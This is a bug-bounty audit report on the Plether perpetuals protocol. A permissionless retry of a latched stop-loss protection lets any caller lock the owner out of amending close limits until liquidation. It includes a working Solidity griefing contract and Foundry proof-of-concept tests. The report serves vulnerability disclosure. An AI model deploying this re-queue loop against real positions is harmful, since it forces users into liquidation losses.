# \#98255 [SC-High] Anyone can re-queue a Latched TP/SL protection before the owner changes the limits, and keep the position open until liquidation

**Submitted on Nov 6th 2026 at 10:56:10 UTC by @Koo65422 for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98255
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)
  - Contract fails to deliver promised returns, but doesn't lose value

## Description

## Brief / Intro

If you have a stop loss closure that fails due to the owner's close limit.
The protection is `Latched`.
According to the docs, the owner changes their limits with `amendLatchedPositionProtectionCloseLimits` and anyone can try again.
However, `retryPositionProtectionClose` is public and instant. It uses the same old limits.
So if someone else gets there before the owner can change their limits, they can't change them.
And the owner can't cancel or manually close.
So the owner is stuck in a losing position until liquidation, unless the market goes back within the old limits, or the owner manages to get ahead of everyone with one combined transaction.

## Vulnerability Details

To resolve Cecuro MED-9 (PR #124, commit `eadc5c58`), the protocol introduced 4 user-defined close limits for position protections and a single function to update them after a trigger:

- `amendLatchedPositionProtectionCloseLimits` (lines 315-328): only callable by owner, only if `status == Latched` and `pendingOrderCounts(msg.sender) == 0`
- `retryPositionProtectionClose` (lines 382-406): callable by anyone, no delay/block restriction. Requires `status == Latched`, matching position, no pending order. Queues new close order with same stored limits. Sets status back to `Triggered`. Limits are only checked later at execution (`CfdOrderPolicyEvaluatorBase.sol:489-520`).

If close attempt fails on limit (`CfdOrderPolicyEvaluator__ConstraintViolation`) or expires, it goes back to `Latched` in the same transaction (`handleFailedProtectionAttempt`, lines 637-675). Since `OrderRouter.executeOrder` and `OrderRouter.expireOrder` are also permissionless, any third party can keep the protection in `Triggered` state with 3 simple loops (all shown in PoC):

1. Execute + Retry in the same transaction: execute the pending attempt (it fails on the owner's limit, status becomes `Latched`) and immediately call `retryPositionProtectionClose` in the same transaction. Status is never `Latched` between transactions.
2. Simple Retry: wait for protocol keeper to execute the pending attempt. Then call `retryPositionProtectionClose` (nonpayable, no oracle data required) before owner's amendment transaction arrives.
3. Expire + Retry in the same transaction: if no keeper executes the zero-bounty attempt within 60s deadline, call `expireOrder` + `retryPositionProtectionClose` in the same transaction. No oracle data required.

This doesn't even need a malicious actor. `CANONICAL_ENTRYPOINTS.md` (lines 281-283) tells keepers to process the failed attempt, see `Latched`, and submit retry. A regular keeper following these steps will also close the owner's amendment window.

While protection is `Triggered`, all 5 owner exit/update actions revert:

| Owner action | Result while `Triggered` |
|---|---|
| `amendLatchedPositionProtectionCloseLimits` | reverts `OrderRouter__ProtectionNotLatched` |
| `cancelPositionProtection` | reverts `OrderRouter__ProtectionNotArmed` (lines 413-419) |
| `replacePositionProtection` | reverts `OrderRouter__ProtectionNotArmed` (lines 272-277) |
| `cancelPositionProtectionAndCommitClose` | reverts `OrderRouter__ProtectionNotArmed` (lines 345-348) |
| Regular `commitOrder` close | reverts `OrderRouter__ProtectionActive` (`OrderLiquidationBatchLogic.sol:313-314`) |

Even while `Latched`, last 4 actions still revert. So only `amendLatchedPositionProtectionCloseLimits` is the owner's way out. Owner can still add margin or withdraw free collateral, but neither action closes the exposed position.

### Preconditions

- Finite close limit: The protection was set up with at least one finite close limit (introduced in MED-9 fix, exposed in SDK in `packages/perps-aa-client/README.md` "Position protection"). This is relevant for SDK users and direct contract callers who use finite limits. (Note that web app currently sends unlimited limits and there's no amendment UI.)
- Limit failure on execution: The close attempt fails on the limit during normal execution. No third party manipulation is needed. This occurs when carry/fees/frozen market spread goes over the cap (MED-9 scenarios) or when the market moves beyond notional cap (PoC, `PositionProtection.t.sol:903-952`).

### What docs say

Docs and tests assume that owner can amend limits before next retry. But permissionless retry can prevent amendment first.

- MED-9 fix comment: "Only the owner may amend the retained ceilings while protection is Latched; keepers cannot relax them. [...] Tight limits may prevent execution until conditions improve or the owner amends them."
- Code comments and developer docs: All specs say that owner amends when `Latched` before queuing retry.
  - `packages/perps/src/interfaces/IPositionProtectionActions.sol` (32-33): "Lets the owner change close limits after a failed attempt relatches, before a fresh retry. [...] A live child cannot be changed."
  - `packages/perps/WORKING_WITH_AI_AGENTS.md` (283-284): "If a queued close fails and the protected side and size still match, protection becomes `Latched`; the owner may amend its limits before retrying."
  - `packages/perps/CANONICAL_ENTRYPOINTS.md` (145-148): "The owner may amend the close ceilings of a `Latched` protection [...] when the account has no pending Router order. This changes the limits used for a future retry".
  - `packages/perps-aa-client/README.md` (204-205): Amendment builder "lets the owner change the close limits of a `Latched` protection before a permissionless retry."
- Keeper advice (`packages/perps/DEPLOYMENT.md` 419-421): Keepers are advised to "Investigate planner, constraint, or other persistent failures before retrying; do not continuously queue the same failing attempt." But this isn't enforced in contract. And competition rules apply to anything allowed by contracts. Also, public docs say "Being permissionless does not give keepers discretion over protocol outcomes" (plether-app `apps/gitbook/how-plether-works/keepers-and-permissionless-execution.md`). But here any retry caller determines whether owner can call their recovery function.
- Repo tests (`PositionProtection.t.sol` 954-1005): `test_ProtectionCloseLimits_OnlyOwnerCanAmendLatchedLimitsForNextRetry` only tests the case where owner amends first and third party retries second. It tests that amending reverts when retry is pending (994-996). But there's no test for the case where third party retry happens first.

### Relation to known issues

- Cecuro MED-9 fix: close limits and `amendLatchedPositionProtectionCloseLimits` were added post-Cecuro audit to address MED-9. New bugs introduced by a fix are rewarded under competition rules.
- Previous AI scan ("Protection trigger bounty is paid before a zero-bounty close is executed"): This is prior to the MED-9 fix and is the opposite issue (close attempt is stuck because nobody is processing it). This bug is the issue of active retries re-queuing the failed attempt and preventing the owner from calling `amendLatchedPositionProtectionCloseLimits`.
- `SECURITY.md` ("Router and keeper limitations"): This section mentions that liveness relies on keepers processing failed attempts and submitting retries. It recommends operators to alert on long-lasting `Latched` states. It doesn't mention that submitting a retry prevents the owner from amending their close limits.

## Impact Details

- Position stuck open: if the close attempt of a triggered protection fails its limits, it can be re-queued indefinitely, preventing `amendLatchedPositionProtectionCloseLimits` and leaving the owner with no other way to exit while the re-queueing continues. The position will remain open and vulnerable to the market.
- Quantified loss (PoC with release risk parameters, $10k position, 2k USDG margin, stop at 1.10, market at 1.12):
  - If the owner can amend: the position will close with a loss of 1,208.88 USDG.
  - If blocked by retries: the position will be liquidated with a loss of 2,000.40 USDG as the market keeps moving (liquidatable from ~1.197, liquidated at 1.25 in the PoC). In the PoC, the caller of the loop also receives the 5 USDG liquidation bounty.
- Minimal cost for the caller: only gas (and Pyth update fee if directly executing the attempt). No oracle data, no protocol balance, no registered account needed for the plain retry and expire-and-retry cases.
- Why regular users are stuck: if the owner just signs and sends `amendLatchedPositionProtectionCloseLimits` as documented, the protection will always be in `Triggered` state while the loop is running.
- The owner only needs to win once to break out of the loop (the next retry will copy the new amended limits, see last PoC test), but this requires custom automation: the owner needs to terminate the pending attempt (by executing it with a signed historical tick or expiring it after the deadline) and include `amendLatchedPositionProtectionCloseLimits` in the same tx from a smart contract account.
- For re-queued attempts, outside oracle frozen windows it needs to be in a later block and have a post-commit tick to be executed. For frozen windows, the two checks are not needed (`OrderRouterExecutionSidecar.sol:447-452`).

### Confirmed on deployed contracts

Read-only fork test on deployed Arbitrum Sepolia v2.0.0 (`LatchedProtectionRetryDeployedConfigFork.t.sol`) shows that PoC is using the same config as the live deployment:

- Engine risk params: same as in PoC `_riskParams()` (maintenance 10 bps, initial 20 bps, FAD 300 bps, base carry 500 bps, min bounty 1 USDG, bounty 10 bps, keeper share 50%, protocol share 0, VPI factor 0.01, max skew 0.4)
- Execution/protection config: `maxExecutionWindowSeconds` is 60s (the one used in expire-retry loop), `minOpenNotionalAssets` is 1,000 USDG, trigger bounty is 0.2 USDG, market is not degraded/oracle frozen
- Source code is the same: deployed v2.0.0 build (`1209ca8a`) is byte-identical to scoped commit (`a82d4fef`) in `packages/perps/src` (`git diff 1209ca8a a82d4fef -- packages/perps/src` is empty), so main PoC tests the same Router/Engine/Book logic as deployed

### Severity

- Medium: because it's the same as competition's Medium category "Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)" - caller doesn't get anything except small liquidation bounty, but locks user in a losing position. Also similar to previous Medium findings Cecuro MED-9 and MED-15 ("Triggered SHORT protection can get stuck and leave a user unprotected") - both carry that report's automated Medium rating.
- Mitigating factors (for triage): only affects protections with finite close limit, and it's a race condition lock that can be won by owner with custom automation (not unconditional freeze)

## Recommendation

Any of the following fixes the issue:

1. Allow to amend while `Triggered`: also allow owner to amend close limits while `status == Triggered` (to take effect on next retry), so no need to catch `Latched` state
2. Block 3rd party retries after limit failures: if attempt fails due to constraint violation (not expiry), then require owner action (amend or owner-initiated retry) to re-enable permissionless retries
3. Allow owner exit: allow owner to exit directly from `Latched`/`Triggered` (e.g. allow `cancelPositionProtectionAndCommitClose` to override latched protection)

## References

- `packages/perps/src/PositionProtectionBook.sol`: 272-277, 315-328, 345-348, 382-406, 413-419, 637-675
- `packages/perps/src/interfaces/IPositionProtectionActions.sol`: 32-33, 70-73
- `packages/perps/src/OrderRouter.sol`: 191-196, 240-247, 440-472
- `packages/perps/src/OrderRecoverySidecar.sol`: 49-64
- `packages/perps/src/OrderRouterExecutionSidecar.sol`: 447-452
- `packages/perps/src/router/OrderLiquidationBatchLogic.sol`: 186-211, 313-314
- `packages/perps/src/CfdOrderPolicyEvaluatorBase.sol`: 489-520
- `packages/perps/WORKING_WITH_AI_AGENTS.md`: 265-266, 283-290
- `packages/perps/CANONICAL_ENTRYPOINTS.md`: 142-148, 257-259, 281-283
- `packages/perps/DEPLOYMENT.md`: 419-421
- `packages/perps/SECURITY.md`: 547-552, 1356-1359
- `packages/perps-aa-client/README.md`: 204-205
- `packages/perps/test/perps/spec/trader/PositionProtection.t.sol`: 903-952, 954-1005
- Cecuro AI audit report: MED-9 (team comment), MED-15
- Commit `eadc5c58` (PR #124), which added the limits and the amendment
- Team documentation in the public repository `Plether-Fi/plether-app` (branch `master`, read on 2026-11-05): `apps/gitbook/how-plether-works/keepers-and-permissionless-execution.md`; `docs/runbooks/position-protection.md` ("the current web ticket uses uint256-max bounds")


## Proof of Concept

## Proof of Concept

Save the following test file as `packages/perps/test/perps/differential/LatchedProtectionRetryBlocksLimitAmendment.t.sol` in the scoped commit (no in-scope contracts are changed) and execute from the root of the repo:

```bash
forge test --root packages/perps --match-path "test/perps/differential/LatchedProtectionRetryBlocksLimitAmendment.t.sol" -vv
```

All 6 tests pass:

| Test | Description |
|---|---|
| `test_PoC_ExecuteAndRetryInOneTransactionLeavesOwnerNoBlockToAmend` | 5 rounds of `executeOrder` + `retryPositionProtectionClose` in one transaction each. Status is `Triggered` after each round. All 5 owner actions revert. |
| `test_PoC_PlainRetryAfterTheKeepersFailedExecutionIsEnough` | After the keeper executes the pending attempt (`Latched`), a third party calls `retryPositionProtectionClose` first. Owner's amendment reverts. |
| `test_PoC_ExpireAndRetryNeedsNoOracleData` | After 60s deadline without execution, one transaction `expireOrder` + `retryPositionProtectionClose` without oracle data. |
| `test_PoC_LockedPositionEndsInLiquidationAndTheGrieferCollectsTheBounty` | End-to-end. Keeping the position in the retry loop results in liquidation (2,000.40 USDG owner loss). 5 USDG liquidation bounty paid to the caller. |
| `test_Control_OwnerAmendsLatchedLimitsAndTheRetryCloses` | Baseline without interference. Owner amends while `Latched`. Next retry closes the position (1,208.88 USDG owner loss). |
| `test_Escape_OwnerMustTerminateHerOwnAttemptAndAmendBeforeAnyoneRetries` | The escape path. Owner executes the pending attempt and amends before anyone retries. Next retry closes the position. |

### (Optional) Fork verification (`LatchedProtectionRetryDeployedConfigFork.t.sol`)

To verify `test_Deployed_ConfigMatchesThePocParameters` against a read-only fork of the live Arbitrum Sepolia v2.0.0 deployment, use an archival RPC (e.g. https://arbitrum-sepolia.gateway.tenderly.co) and execute:

```bash
ARB_SEPOLIA_RPC_URL=https://arbitrum-sepolia.gateway.tenderly.co forge test --root packages/perps --match-path "test/perps/differential/LatchedProtectionRetryDeployedConfigFork.t.sol" -vv
```

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IOrderLifecycleBook} from "@plether/perps/interfaces/IOrderLifecycleBook.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {IOrderRouterErrors} from "@plether/perps/interfaces/IOrderRouterErrors.sol";
import {IPositionProtectionActions} from "@plether/perps/interfaces/IPositionProtectionActions.sol";
import {IPositionProtectionViews} from "@plether/perps/interfaces/IPositionProtectionViews.sol";
import {PositionProtectionTypes} from "@plether/perps/interfaces/PositionProtectionTypes.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";

interface IRouterExecute {

    function executeOrder(
        uint64 orderId,
        bytes[] calldata pythUpdateData
    ) external payable returns (OrderV3Types.ExecutionResult memory);

    function expireOrder(
        uint64 orderId
    ) external returns (OrderV3Types.ExecutionResult memory);

}

/// @dev Anyone can deploy this. It has no role, no collateral and no account in the protocol. The caller pays gas
///      and, for `run`, forwards the Pyth fee a keeper would pay for the same execution.
contract FailAndRequeue {

    IRouterExecute private immutable ROUTER;
    IPositionProtectionActions private immutable BOOK;

    constructor(
        address router,
        address book
    ) {
        ROUTER = IRouterExecute(router);
        BOOK = IPositionProtectionActions(book);
    }

    /// @notice Executes the pending protection close, which fails on the owner's own limit and relatches, then
    ///         queues the next attempt before the transaction ends.
    function run(
        uint64 attemptId,
        bytes[] calldata pythUpdateData,
        uint64 protectionId
    ) external payable returns (uint64 nextAttemptId) {
        ROUTER.executeOrder{value: msg.value}(attemptId, pythUpdateData);
        nextAttemptId = BOOK.retryPositionProtectionClose(protectionId);
    }

    /// @notice The oracle-free variant: once an attempt is past its deadline, expire it and queue the next one.
    function expireAndRequeue(
        uint64 attemptId,
        uint64 protectionId
    ) external returns (uint64 nextAttemptId) {
        ROUTER.expireOrder(attemptId);
        nextAttemptId = BOOK.retryPositionProtectionClose(protectionId);
    }

    receive() external payable {}

}

/// @notice PoC: whoever terminates a protection close attempt (by executing it or expiring it) can queue the next
///         attempt in the same transaction, so the owner does not find the protection `Latched` and cannot use
///         `amendLatchedPositionProtectionCloseLimits`, the remedy the protocol gives for close limits that can
///         no longer be met. The owner cannot cancel, replace or manually close either. The position stays open
///         while the re-queueing continues, unless the owner terminates her own attempt first and amends before
///         anyone retries (last test).
///
///         Mechanism (PositionProtectionBook.sol):
///         - `amendLatchedPositionProtectionCloseLimits` (lines 315-328) requires status `Latched` and no pending
///           Router order for the account.
///         - `retryPositionProtectionClose` (lines 382-406) is permissionless, has no delay, and moves the
///           protection from `Latched` back to `Triggered` with a new pending close that copies the SAME limits.
///         - A failed or expired close attempt relatches in the transaction that terminates it
///           (`handleFailedProtectionAttempt`, lines 637-675). Execution, expiry and retry are all permissionless,
///           so one transaction can terminate and re-queue. The protection is then not `Latched` at any
///           transaction boundary.
///         - While a protection is `Triggered` or `Latched` the owner cannot cancel or replace it
///           (`OrderRouter__ProtectionNotArmed`), cannot use `cancelPositionProtectionAndCommitClose`, and cannot
///           commit an ordinary close (`OrderRouter__ProtectionActive`, OrderLiquidationBatchLogic.sol:313-314).
///
///         The limits and the amendment were introduced by the fix for Cecuro MED-9. The team's comment there:
///         "Only the owner may amend the retained ceilings while protection is Latched ... Tight limits may prevent
///         execution until conditions improve or the owner amends them." `WORKING_WITH_AI_AGENTS.md`: "protection
///         becomes `Latched`; the owner may amend its limits before retrying."
contract LatchedProtectionRetryBlocksLimitAmendmentTest is BasePerpTest {

    address private constant ALICE = address(0xA11CE);
    address private constant KEEPER = address(0xBEEF);
    address private constant GRIEFER = address(0xBAD);

    uint256 private constant PRICE = 1e8;
    uint256 private constant SIZE = 10_000e18; // $10,000 notional at $1.00
    uint256 private constant MARGIN_ASSETS = 2000e6;
    uint256 private constant LONG_STOP_LOSS = 110_000_000;
    /// @dev The market moves through Alice's stop before her close executes.
    uint256 private constant GAP_PRICE = 112_000_000;
    /// @dev Alice caps the close at the notional of her stop price: 10,000 x 1.10.
    uint256 private constant NOTIONAL_AT_STOP_ASSETS = 11_000e6;
    /// @dev A later price at which Alice's 5x position is past its maintenance margin.
    uint256 private constant LIQUIDATION_PRICE = 125_000_000;
    uint256 private constant ROUNDS = 5;

    /// @dev Release minimum from packages/perps/DEPLOYMENT.md (`minOpenNotionalAssets = 1_000e6`).
    uint256 private constant RELEASE_MIN_NOTIONAL_ASSETS = 1000e6;

    IPositionProtectionActions private protectionActions;
    IPositionProtectionViews private protectionViews;
    FailAndRequeue private failAndRequeue;

    /// @dev Release risk parameters from packages/perps/DEPLOYMENT.md.
    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function setUp() public override {
        super.setUp();
        IOrderRouterAdminHost.RouterConfig memory config = _routerConfig();
        config.minOpenNotionalAssets = RELEASE_MIN_NOTIONAL_ASSETS;
        _setRouterConfig(config);
        protectionActions = IPositionProtectionActions(address(router.positionProtectionBook()));
        protectionViews = IPositionProtectionViews(address(router.positionProtectionBook()));
        failAndRequeue = new FailAndRequeue(address(router), address(router.positionProtectionBook()));

        _fundTrader(ALICE, 20_000e6);
        _refreshLiveMark(PRICE);
    }

    /// @dev One transaction per round: execute the failing attempt and queue the next one. Alice is not offered a
    ///      block in which the protection is `Latched`.
    function test_PoC_ExecuteAndRetryInOneTransactionLeavesOwnerNoBlockToAmend() public {
        uint64 protectionId = _armStopWithNotionalCap();
        uint64 attemptId = _triggerStop(protectionId, GAP_PRICE);

        for (uint256 round; round < ROUNDS; ++round) {
            bytes[] memory executionData = _mockPythUpdateData(GAP_PRICE); // next block, first tick after the commit
            vm.prank(GRIEFER);
            uint64 nextAttemptId = failAndRequeue.run(attemptId, executionData, protectionId);

            _assertFailedOnOwnersLimit(attemptId);
            assertEq(_status(protectionId), uint8(PositionProtectionTypes.PositionProtectionStatus.Triggered));
            assertEq(router.pendingOrderCounts(ALICE), 1, "a fresh attempt with the same limits is already queued");
            _expectOwnerLockedOut(protectionId);
            attemptId = nextAttemptId;
        }

        (uint256 size,,,,,,) = engine.positions(ALICE);
        assertEq(size, SIZE, "the stop triggered five rounds ago and the position is still open");
    }

    /// @dev The cheaper variant. The griefer lets the protocol keeper pay for the failing execution and only sends
    ///      the plain retry (no Pyth data, no ETH, no account) before Alice's amendment lands.
    function test_PoC_PlainRetryAfterTheKeepersFailedExecutionIsEnough() public {
        uint64 protectionId = _armStopWithNotionalCap();
        uint64 attemptId = _triggerStop(protectionId, GAP_PRICE);

        for (uint256 round; round < ROUNDS; ++round) {
            bytes[] memory executionData = _mockPythUpdateData(GAP_PRICE);
            vm.prank(KEEPER);
            router.executeOrder(attemptId, executionData);
            _assertFailedOnOwnersLimit(attemptId);
            // This is the documented moment for the owner: "the owner may amend its limits before retrying".
            assertEq(_status(protectionId), uint8(PositionProtectionTypes.PositionProtectionStatus.Latched));

            vm.prank(GRIEFER);
            attemptId = protectionActions.retryPositionProtectionClose(protectionId);
            _expectOwnerLockedOut(protectionId);
        }
    }

    /// @dev End to end. Alice's stop triggered at 1.12 and she would accept the larger close, but she is not
    ///      allowed to say so while the loop runs. The market keeps moving, the position is liquidated at 1.25
    ///      (it is liquidatable from about 1.197), and the account that ran the loop collects the bounty.
    function test_PoC_LockedPositionEndsInLiquidationAndTheGrieferCollectsTheBounty() public {
        uint256 aliceBefore = clearinghouse.balanceAssets(ALICE);
        uint64 protectionId = _armStopWithNotionalCap();
        uint64 attemptId = _triggerStop(protectionId, GAP_PRICE);

        for (uint256 round; round < 3; ++round) {
            bytes[] memory executionData = _mockPythUpdateData(GAP_PRICE);
            vm.prank(GRIEFER);
            attemptId = failAndRequeue.run(attemptId, executionData, protectionId);
            _expectOwnerLockedOut(protectionId);
        }

        // The market keeps moving against Alice. The re-queued close still exceeds her cap and fails again.
        bytes[] memory lateData = _mockPythUpdateData(LIQUIDATION_PRICE);
        vm.prank(GRIEFER);
        failAndRequeue.run(attemptId, lateData, protectionId);
        _expectOwnerLockedOut(protectionId);

        _mockPythUpdateData(LIQUIDATION_PRICE);
        bytes[] memory liveData = _livePayload(LIQUIDATION_PRICE);
        uint256 grieferBefore = clearinghouse.balanceAssets(GRIEFER);
        vm.prank(GRIEFER);
        router.executeLiquidation(ALICE, liveData);

        (uint256 size,,,,,,) = engine.positions(ALICE);
        assertEq(size, 0, "the position was liquidated instead of stopped out");
        assertEq(_status(protectionId), uint8(PositionProtectionTypes.PositionProtectionStatus.Liquidated));
        assertGt(clearinghouse.balanceAssets(GRIEFER), grieferBefore, "the griefer collects the liquidation bounty");
        emit log_named_decimal_uint(
            "liquidation bounty paid to the griefer (USDG)", clearinghouse.balanceAssets(GRIEFER) - grieferBefore, 6
        );
        emit log_named_decimal_uint(
            "Alice's loss when locked in until liquidation (USDG)", aliceBefore - clearinghouse.balanceAssets(ALICE), 6
        );
    }

    /// @dev No oracle data at all. When nobody executes the zero-bounty attempt it passes its deadline, and one
    ///      transaction can expire it and queue the next attempt.
    function test_PoC_ExpireAndRetryNeedsNoOracleData() public {
        uint64 protectionId = _armStopWithNotionalCap();
        uint64 attemptId = _triggerStop(protectionId, GAP_PRICE);

        for (uint256 round; round < 3; ++round) {
            uint64 deadline =
                IOrderLifecycleBook(address(router.lifecycleBook())).orderTiming(attemptId).executionDeadline;
            vm.roll(vm.getBlockNumber() + 1);
            vm.warp(uint256(deadline) + 1);
            vm.prank(GRIEFER);
            attemptId = failAndRequeue.expireAndRequeue(attemptId, protectionId);
            assertEq(_status(protectionId), uint8(PositionProtectionTypes.PositionProtectionStatus.Triggered));
            _expectOwnerLockedOut(protectionId);
        }
    }

    /// @dev Control: without the third-party retry the documented remedy works and the position closes.
    function test_Control_OwnerAmendsLatchedLimitsAndTheRetryCloses() public {
        uint256 aliceBefore = clearinghouse.balanceAssets(ALICE);
        uint64 protectionId = _armStopWithNotionalCap();
        uint64 attemptId = _triggerStop(protectionId, GAP_PRICE);

        bytes[] memory executionData = _mockPythUpdateData(GAP_PRICE);
        vm.prank(KEEPER);
        router.executeOrder(attemptId, executionData);
        _assertFailedOnOwnersLimit(attemptId);

        vm.prank(ALICE);
        protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, _unlimited());

        vm.prank(KEEPER);
        uint64 retryId = protectionActions.retryPositionProtectionClose(protectionId);
        executionData = _mockPythUpdateData(GAP_PRICE);
        vm.prank(KEEPER);
        router.executeOrder(retryId, executionData);

        (uint256 size,,,,,,) = engine.positions(ALICE);
        assertEq(size, 0, "the amended retry closed the position");
        emit log_named_decimal_uint(
            "Alice's loss when she can amend and close at 1.12 (USDG)",
            aliceBefore - clearinghouse.balanceAssets(ALICE),
            6
        );
    }

    /// @dev What it takes to get out while the loop runs: Alice must terminate her own attempt before the other
    ///      party does (execute it with the signed historical tick, or expire it after its deadline) and amend
    ///      before anyone retries. A contract account can put both calls in one transaction; here they are two
    ///      calls with nothing in between. An amendment sent on its own finds the protection `Triggered`.
    ///      One win is final: the next retry, whoever sends it, carries the amended limits.
    function test_Escape_OwnerMustTerminateHerOwnAttemptAndAmendBeforeAnyoneRetries() public {
        uint64 protectionId = _armStopWithNotionalCap();
        uint64 attemptId = _triggerStop(protectionId, GAP_PRICE);

        bytes[] memory executionData = _mockPythUpdateData(GAP_PRICE);
        vm.prank(GRIEFER);
        attemptId = failAndRequeue.run(attemptId, executionData, protectionId);
        _expectOwnerLockedOut(protectionId);

        executionData = _mockPythUpdateData(GAP_PRICE);
        vm.startPrank(ALICE);
        router.executeOrder(attemptId, executionData);
        protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, _unlimited());
        vm.stopPrank();
        assertEq(
            protectionViews.closeFinancialLimits(protectionId).maxExecutionNotionalAssets,
            type(uint256).max,
            "limits amended"
        );

        vm.prank(GRIEFER);
        uint64 retryId = protectionActions.retryPositionProtectionClose(protectionId);
        executionData = _mockPythUpdateData(GAP_PRICE);
        vm.prank(KEEPER);
        router.executeOrder(retryId, executionData);
        (uint256 size,,,,,,) = engine.positions(ALICE);
        assertEq(size, 0, "the retry with the amended limits closed the position");
    }

    /// @dev Alice opens through the Router, a keeper refreshes the mark, and she arms a stop-loss whose automatic
    ///      close may not exceed the notional of her stop price.
    function _armStopWithNotionalCap() private returns (uint64 protectionId) {
        vm.prank(ALICE);
        uint64 orderId = router.commitOrder(CfdTypes.Side.LONG, SIZE, MARGIN_ASSETS, PRICE, false);
        bytes[] memory updateData = _mockPythUpdateData(PRICE);
        vm.prank(KEEPER);
        router.executeOrder(orderId, updateData);
        _refreshLiveMark(PRICE);

        PositionProtectionTypes.PositionProtectionParams memory params;
        params.stopLossTriggerPrice = LONG_STOP_LOSS;
        params.closeLimits = _unlimited();
        params.closeLimits.maxExecutionNotionalAssets = NOTIONAL_AT_STOP_ASSETS;
        vm.prank(ALICE);
        protectionId = protectionActions.createPositionProtection(params);
    }

    /// @dev A keeper triggers the stop with a signed live basket in a later block, as the team's own helper does.
    function _triggerStop(
        uint64 protectionId,
        uint256 price
    ) private returns (uint64 attemptId) {
        _mockPythUpdateData(price);
        bytes[] memory liveData = _livePayload(price);
        vm.prank(KEEPER);
        attemptId = protectionActions.triggerPositionProtection(protectionId, liveData);
        assertEq(_status(protectionId), uint8(PositionProtectionTypes.PositionProtectionStatus.Triggered));
    }

    function _assertFailedOnOwnersLimit(
        uint64 attemptId
    ) private view {
        OrderV3Types.TerminalOutcome memory outcome =
            IOrderLifecycleBook(address(router.lifecycleBook())).terminalOutcome(attemptId);
        assertEq(uint8(outcome.status), uint8(OrderV3Types.LifecycleStatus.Failed), "the bounded close failed");
        assertEq(
            uint8(outcome.reason),
            uint8(OrderV3Types.TerminalReason.ConstraintViolation),
            "it failed on the owner's own financial limit"
        );
    }

    /// @dev Every exit the owner has is closed while the re-queued attempt is pending.
    function _expectOwnerLockedOut(
        uint64 protectionId
    ) private {
        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
        protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, _unlimited());

        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector);
        protectionActions.cancelPositionProtection(protectionId);

        PositionProtectionTypes.PositionProtectionParams memory params;
        params.stopLossTriggerPrice = LONG_STOP_LOSS;
        params.closeLimits = _unlimited();
        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector);
        protectionActions.replacePositionProtection(protectionId, params);

        OrderV3Types.OrderRequest memory closeRequest = _closeRequest();
        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector);
        protectionActions.cancelPositionProtectionAndCommitClose(protectionId, closeRequest);

        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionActive.selector);
        router.commitOrder(CfdTypes.Side.LONG, SIZE, 0, 0, true);
    }

    function _status(
        uint64 protectionId
    ) private view returns (uint8) {
        return uint8(protectionViews.getPositionProtection(protectionId).status);
    }

    function _unlimited() private pure returns (PositionProtectionTypes.CloseFinancialLimits memory limits) {
        limits = PositionProtectionTypes.CloseFinancialLimits({
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max
        });
    }

    /// @dev Permissionless keeper mark refresh with a complete signed live basket at the current timestamp.
    function _refreshLiveMark(
        uint256 price
    ) private {
        if (vm.getBlockTimestamp() <= engine.lastMarkTime()) {
            vm.warp(uint256(engine.lastMarkTime()) + 1);
        }
        bytes[] memory updateData = _livePayload(price);
        vm.prank(KEEPER);
        router.updateMarkPrice(updateData);
    }

    function _livePayload(
        uint256 price
    ) private view returns (bytes[] memory updateData) {
        bytes32[] memory ids = _basePythFeedIds();
        MockPyth.FeedUpdate[] memory ticks = new MockPyth.FeedUpdate[](ids.length);
        uint256 previous = engine.lastMarkTime();
        for (uint256 i; i < ids.length; ++i) {
            ticks[i] = MockPyth.FeedUpdate(
                ids[i], MockPyth.MockPrice(int64(uint64(price)), 0, -8, vm.getBlockTimestamp(), previous)
            );
        }
        updateData = new bytes[](1);
        updateData[0] = abi.encode(ticks);
    }

    function _closeRequest() private view returns (OrderV3Types.OrderRequest memory request) {
        request = OrderV3Types.OrderRequest({
            clientOrderId: bytes32(uint256(0xC105E)),
            side: CfdTypes.Side.LONG,
            sizeDelta: SIZE,
            marginDelta: 0,
            targetPrice: 0,
            isClose: true,
            bounds: OrderV3Types.ExecutionBounds({
                submitBy: uint64(vm.getBlockTimestamp()),
                executionWindowSeconds: 60,
                allowedExecutionModes: 7,
                expectedConfigHash: IOrderLifecycleBook(address(router.lifecycleBook())).currentExecutionConfigHash(),
                maxExecutionBountyAssets: type(uint256).max,
                maxExecutionNotionalAssets: type(uint256).max,
                maxGrossAccountDebitAssets: type(uint256).max,
                maxActionChargeAssets: type(uint256).max,
                maxExplicitFeesAssets: type(uint256).max,
                maxPostPositionSize: type(uint256).max,
                minPostSettlementBalanceAssets: 0,
                minPostPositionEquityAssets: 0,
                maxPostLeverageBps: type(uint32).max
            })
        });
    }

}
```

